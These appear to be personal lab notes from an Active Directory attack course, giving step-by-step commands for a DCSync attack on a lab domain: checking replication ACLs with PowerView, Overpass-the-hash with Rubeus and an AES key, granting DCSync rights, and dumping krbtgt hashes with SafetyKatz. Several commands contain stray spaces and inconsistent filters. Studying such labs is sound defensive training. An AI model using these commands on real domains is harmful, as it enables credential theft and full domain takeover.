
− Check if studentuserx has Replication (DCSync) rights. 
− If yes, execute the DCSync attack to pull hashes of the krbtgt user. 
− If no, add the replication rights for the studentuserx and execute the DCSync attack to pull hashes of the krbtgt user.


We can check if studentuser139 has replication rights using the following PowerView command. Use it from InvisiShell:

Powerview:

```
Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replicationget') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser139"}
```

We got no output as studentuser139 does not have the replication rights. But,

We can add those rights with Domain Administrator privileges! Using Overpass-the-hash, let's run a command prompt with DA privileges:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

In the new process, use either PowerView:

```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser139 -Rights DCSync - PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

Use the Active Directory module with Set-ADACL from RACE as Domain Admin:

```
Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' - SamAccountName studentuser139 -GUIDRight DCSync -Verbose
```

Let’s check for the rights once again from a normal shell:

```
Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights - match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser139"}
```

Sweet! Now, below commands can be used as studentuser139 to get the hashes of krbtgt user:

```
echo %Pwn% lsadump::dcsync
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit"
```

![[Pasted image 20250319115648.png]]

